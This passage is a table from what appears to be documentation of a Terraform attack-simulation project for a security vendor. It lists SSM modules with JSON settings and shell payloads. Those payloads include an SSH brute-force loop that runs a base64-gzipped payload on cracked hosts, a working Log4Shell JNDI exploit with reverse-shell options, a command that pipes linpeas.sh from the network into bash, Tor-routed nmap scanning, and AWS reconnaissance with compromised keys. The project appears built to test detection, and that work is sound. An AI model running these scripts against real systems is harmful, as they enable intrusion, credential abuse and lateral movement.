\-P $\{var\.inputs\["password\_list"\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        log "Running: hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        \}<br/>        \# Read Hydra output file line by line<br/>        while IFS= read \-r line; do<br/>            \# Parse Hydra output<br/>            host=$\(echo "$line" \| awk '\{print $3\}'\)<br/>            username=$\(echo "$line" \| awk '\{print $5\}'\)<br/>            password=$\(echo "$line" \| awk '\{print $7\}'\)<br/>            log "Attempting to execute payload: sshpass \-p \\"$password\\" ssh \-o StrictHostKeyChecking=no \\"$username\\"@\\"$host\\" 'echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash"<br/>            sshpass \-p "$password" ssh \-o StrictHostKeyChecking=no "$username"@"$host" 'echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash'<br/>            log "Done"<br/>        done < <\(grep \-v "^\#" /tmp/hydra\-found\.txt \| sort \| uniq\)<br/>        log "Done\."<br/><br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>            log "waiting $\{var\.inputs\["attack\_delay"\]\} seconds\.\.\.";<br/>            sleep $\{var\.inputs\["attack\_delay"\]\}<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = "sshpass jq"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = "sshpass jq"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-ssm-execute-docker-exploit-log4j                                  | ./modules/ssm/execute-docker-exploit-log4j                     | ssm_exec_docker_exploit_log4j_app          | context.aws.ssm.attacker.execute.docker_exploit_log4j_app                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_exploit_log4j_app": {<br/>                            "attack_delay": 50400,<br/>                            "attacker_http_port": 8088,<br/>                            "attacker_ip": null,<br/>                            "attacker_ldap_port": 1389,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell": false,<br/>                            "reverse_shell_port": 0,<br/>                            "target_ip": null,<br/>                            "target_port": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-exploit-log4j                     | <pre>locals \{<br/>    attack\_dir = "/jndiexploit"<br/>    attack\_script = "jndiexploit\.sh"<br/>    start\_script = "delayed\_start\.sh"<br/>    lock\_file = "/tmp/delay\_log4shell\.lock"<br/>    jndiexploit\_url="https://github\.com/credibleforce/jndi/raw/main/jndi\.base64"<br/>    image = "openjdk:11"<br/>    name = "jndiexploit"<br/>    exec\_type = var\.inputs\["reverse\_shell"\] == true ? "ReverseShell" : "Basic/Command/Base64"<br/><br/>    \# only base64 encode the payload if we are executing a command<br/>    base64\_log4shell\_payload= urlencode\(var\.inputs\["reverse\_shell"\] == true ? var\.inputs\["payload"\] : base64encode\(<br/>       replace\(replace\(var\.inputs\["payload"\], "$ATTACKER\_IP", var\.inputs\["attacker\_ip"\]\), "$REVERSE\_SHELL\_PORT", var\.inputs\["reverse\_shell\_port"\]\)<br/>    \)\)<br/>    payload = <<\-EOT<br/>    log "removing previous app directory"<br/>    docker stop $\{local\.name\}<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    log "creating app directory"<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    <br/>    log "starting script\.\.\."<br/>    JNDIEXPLOIT\_URL="$\{local\.jndiexploit\_url\}"<br/>    NAME="$\{local\.name\}"<br/>    IMAGE="$\{local\.image\}"<br/>    ATTACKER\_IP="$\{var\.inputs\["attacker\_ip"\]\}"<br/>    ATTACKER\_HTTP\_PORT=$\{var\.inputs\["attacker\_http\_port"\]\}<br/>    ATTACKER\_LDAP\_PORT=$\{var\.inputs\["attacker\_ldap\_port"\]\}<br/>    TARGET\_IP=$\{var\.inputs\["target\_ip"\]\}<br/>    TARGET\_PORT=$\{var\.inputs\["target\_port"\]\}<br/>    EXEC\_TYPE="$\{local\.exec\_type\}"<br/>    REVERSE\_SHELL\_PORT="$\{var\.inputs\["reverse\_shell\_port"\]\}"<br/>    BASE64\_PAYLOAD="$\{local\.base64\_log4shell\_payload\}"<br/>    PUBLIC\_IP=$\(curl \-s https://icanhazip\.com\)<br/>    TIMEOUT=1800<br/>    START\_TIME=$\(date \+%s\)<br/>    \# Check if $ATTACKER\_IP is an IP address<br/>    if \[\[ $ATTACKER\_IP =~ ^\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+$ \]\]; then<br/>        log "server is set to IP address $ATTACKER\_IP, no need to resolve DNS"<br/>    else<br/>        log "checking dns resolution: $ATTACKER\_IP"<br/>        while true; do<br/>            IP=$\(dig \+short $ATTACKER\_IP\)<br/>            if \[ \-z "$IP" \]; then  \# If $IP is empty, the domain hasn't resolved yet<br/>                CURRENT\_TIME=$\(date \+%s\)<br/>                ELAPSED\_TIME=$\(\(CURRENT\_TIME \- START\_TIME\)\)<br/>                if \[ $ELAPSED\_TIME \-gt $TIMEOUT \]; then<br/>                    log "DNS resolution for $ATTACKER\_IP timed out after $TIMEOUT seconds"<br/>                    exit 1<br/>                fi<br/>                sleep 10<br/>            else<br/>                log "Current public ip: $PUBLIC\_IP"<br/>                log "$ATTACKER\_IP resolved to $IP"<br/>                if \[ "$IP" == "$PUBLIC\_IP" \]; then<br/>                    log "Resolution matches public ip: $IP == $PUBLIC\_IP"<br/>                    break<br/>                else<br/>                    log "Resolution of dns does not match: $IP \!= $PUBLIC\_IP"<br/>                    sleep 10<br/>                fi<br/>            fi<br/>        done<br/>    fi<br/><br/>    if \[\[ \! \-f "jndi\.base64" \|\| \! \-f "JNDIExploit\-1\.2\-SNAPSHOT\.jar" \]\]; then<br/>        rm \-f jndi\.base64 \*\.zip JNDIExploit\-\*\.jar<br/>        wget https://github\.com/credibleforce/jndi/raw/main/jndi\.base64<br/>        base64 \-d jndi\.base64 > JNDIExploit\.1\.2\.zip<br/>        unzip \-o JNDIExploit\.\*\.zip<br/>        rm \*\.zip<br/>    fi<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "setting up jndiexploit in screen session\.\.\."<br/>        if pgrep \-f "JNDIExploit"; then<br/>            kill \-9 $\(pgrep \-f "JNDIExploit"\)<br/>        fi<br/>        JNDIEXPLOIT\_LOG="/tmp/jndiexploit\.log"<br/>        for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv "$JNDIEXPLOIT\_LOG\."\{$i,$\(\(i\+1\)\)\} 2>/dev/null \|\| true; done<br/>        mv $JNDIEXPLOIT\_LOG "$JNDIEXPLOIT\_LOG\.1" 2>/dev/null \|\| true<br/>        screen \-S jndiexploit \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile $JNDIEXPLOIT\_LOG \-S jndiexploit \-m java \-jar JNDIExploit\-\*\.jar \-\-ip $ATTACKER\_IP \-\-httpPort 8088 \-\-ldapPort 1389<br/>        screen \-S jndiexploit \-X colon "logfile flush 0^M"<br/><br/>        log "sleeping 15 minutes\.\.\."<br/>        sleep 900<br/>        log "start services availability check\.\.\."<br/><br/>        log "checking target: $TARGET\_IP:$TARGET\_PORT"<br/>        while \! nc \-z \-w 5 \-vv $TARGET\_IP $TARGET\_PORT > /dev/null; do<br/>            log "failed check \- waiting for target: $TARGET\_IP:$TARGET\_PORT";<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log "screen session no longer running\.\.\.reset required"<br/>                break<br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log "screen session no longer running\.\.\.reset required"<br/>            break<br/>        fi<br/>        log "target available";<br/>        log "checking attacker ldap: $ATTACKER\_IP:$ATTACKER\_LDAP\_PORT"<br/>        while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $ATTACKER\_LDAP\_PORT > /dev/null; do<br/>            log "failed check \- waiting for attacker ldap: $ATTACKER\_IP:$ATTACKER\_LDAP\_PORT";<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log "screen session no longer running\.\.\.reset required"<br/>                break<br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log "screen session no longer running\.\.\.reset required"<br/>            break<br/>        fi<br/>        log "attacker ldap available";<br/>        log "checking attacker http: $ATTACKER\_IP:$ATTACKER\_HTTP\_PORT"<br/>        while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $ATTACKER\_HTTP\_PORT > /dev/null; do<br/>            log "failed check \- waiting for attacker http: $ATTACKER\_IP:$ATTACKER\_HTTP\_PORT";<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log "screen session no longer running\.\.\.reset required"<br/>                <br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log "screen session no longer running\.\.\.reset required"<br/>            break<br/>        fi<br/>        log "attacker http available";<br/>        if \[ "0" \!= "$REVERSE\_SHELL\_PORT" \]; then<br/>            log "checking attacker reverse shell: $ATTACKER\_IP:$REVERSE\_SHELL\_PORT"<br/>            while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $REVERSE\_SHELL\_PORT > /dev/null; do<br/>                log "failed check \- waiting for attacker reverse shell: $ATTACKER\_IP:$REVERSE\_SHELL\_PORT";<br/>                sleep 30;<br/>                if \! screen \-ls \| grep jndiexploit; then<br/>                    log "screen session no longer running\.\.\.reset required"<br/>                fi<br/>                if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                    log "payload update detected \- exiting loop and forcing payload download"<br/>                    rm \-f /tmp/payload\_$SCRIPTNAME<br/>                    break 2<br/>                fi<br/>            done;<br/>            log "attacker reverse shell available";<br/>        fi<br/>        sleep 30;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log "screen session no longer running\.\.\.reset required"<br/>            break<br/>        fi<br/>        log "sending payload: curl \-\-verbose $TARGET\_IP:$TARGET\_PORT \-H 'X\-Api\-Version: \\$$\{jndi:ldap://$ATTACKER\_IP:$ATTACKER\_LDAP\_PORT/$EXEC\_TYPE/$BASE64\_PAYLOAD\}'"<br/>        /bin/bash \-c "curl \-\-verbose $TARGET\_IP:$TARGET\_PORT \-H 'X\-Api\-Version: \\$$\{jndi:ldap://$ATTACKER\_IP:$ATTACKER\_LDAP\_PORT/$EXEC\_TYPE/$BASE64\_PAYLOAD\}'"<br/>        log "done";<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "waiting $\{var\.inputs\["attack\_delay"\]\} seconds\.\.\.";<br/>            sleep $\{var\.inputs\["attack\_delay"\]\}<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = "git openjdk\-11\-jdk unzip"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = "git java\-11\-openjdk java\-11\-openjdk\-devel unzip"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-ssm-execute-docker-nmap                                           | ./modules/ssm/execute-docker-nmap                              | ssm_exec_docker_nmap_attacker              | context.aws.ssm.attacker.execute.docker_nmap                              | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_nmap": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "ports": [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            "scan_local_network": false,<br/>                            "targets": [],<br/>                            "use_tor": true<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                              | <pre>locals \{<br/>    attack\_dir = "/nmap"<br/>    attack\_script = "nmap\.sh"<br/>    start\_script = "delayed\_start\.sh"<br/>    lock\_file = "/tmp/delay\_nmap\.lock"<br/>    payload = <<\-EOT<br/>    log "cleaning app directory"<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script\.\.\."<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk '/scope global/ \{print $4\}' \| head \-1\)<br/>        log "LOCAL\_NET: $LOCAL\_NET"<br/>        log "Targets: $\{join\(",", var\.inputs\["targets"\]\)\}"<br/>        echo "$\{ length\(var\.inputs\["targets"\]\) > 0 ? join\("\\n", var\.inputs\["targets"\]\) : "$LOCAL\_NET" \}" > /tmp/nmap\-targets\.txt<br/>        log "Ports: $\{join\(",", var\.inputs\["ports"\]\)\}"<br/>        if docker ps \-a \| grep $\{var\.inputs\["container\_name"\]\}; then <br/>            docker stop $\{var\.inputs\["container\_name"\]\}<br/>            docker rm $\{var\.inputs\["container\_name"\]\}<br/>        fi<br/>        $\{ var\.inputs\["use\_tor"\] == true ? <<\-EOF<br/>        log "Using tor network\.\.\."<br/>        if \! docker ps \| grep torproxy > /dev/null; then<br/>        docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f '\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}' torproxy\)<br/>        log "Running via docker: proxychains nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt"<br/>        /bin/bash \-c "docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true" <br/>        /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        : <<\-EOF<br/>        log "Running via docker: nmap \-Pn \-sS \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt"<br/>        /bin/bash \-c "docker run \-\-rm \-v /tmp:/tmp \-\-entrypoint=nmap \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true"<br/>        /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        \}<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>            log "waiting $\{var\.inputs\["attack\_delay"\]\} seconds\.\.\.";<br/>            sleep $\{var\.inputs\["attack\_delay"\]\}<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-ssm-execute-generate-aws-cli-traffic-attacker                     | ./modules/ssm/execute-generate-aws-cli-traffic                 | ssm_exec_generate_aws_cli_traffic_attacker | context.aws.ssm.attacker.execute.generate_aws_cli_traffic                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_aws_cli_traffic": {<br/>                            "commands": [<br/>                                "x=10",<br/>                                "opts=\"--output json --color off --no-cli-pager\"",<br/>                                "while [ $x -gt 0 ]; do ",<br/>                                "log \"Running: aws sts get-caller-identity $opts\"",<br/>                                "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws iam list-users $opts\"",<br/>                                "aws iam list-users $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws s3api list-buckets $opts\"",<br/>                                "aws s3api list-buckets $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-instances $opts\"",<br/>                                "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",<br/>                                "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-volumes $opts\"",<br/>                                "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-vpcs $opts\"",<br/>                                "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",<br/>                                "x=$(($x-1))",<br/>                                "done"<br/>                            ],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "aws-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre> | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-aws-cli-traffic                 | <pre>locals \{<br/>    tool = "aws"<br/>    attack\_dir = "/generate\-aws\-cli\-traffic"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "echo '$\{k\.rendered\}' > $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}" \]\)<br/>    aws\_commands = join\("\\n", \[ for command in var\.inputs\["commands"\]: "$\{command\}" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    source \.env\-aws\-$\{var\.inputs\["compromised\_keys\_user"\]\}<br/>    PROFILE="$\{var\.inputs\["profile"\]\}"<br/>    REGION="$\{var\.inputs\["region"\]\}"<br/>    aws configure set aws\_access\_key\_id $AWS\_ACCESS\_KEY\_ID \-\-profile=$PROFILE<br/>    aws configure set aws\_secret\_access\_key $AWS\_SECRET\_ACCESS\_KEY \-\-profile=$PROFILE<br/>    aws configure set region $REGION \-\-profile=$PROFILE<br/>    aws configure set output json \-\-profile=$PROFILE<br/>    log "Running aws commands\.\.\."<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        $\{local\.aws\_commands\}<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        while \! command \-v $\{local\.tool\} > /dev/null; do<br/>            log "$\{local\.tool\} not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        while \! command \-v $\{local\.tool\} > /dev/null; do<br/>            log "$\{local\.tool\} not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         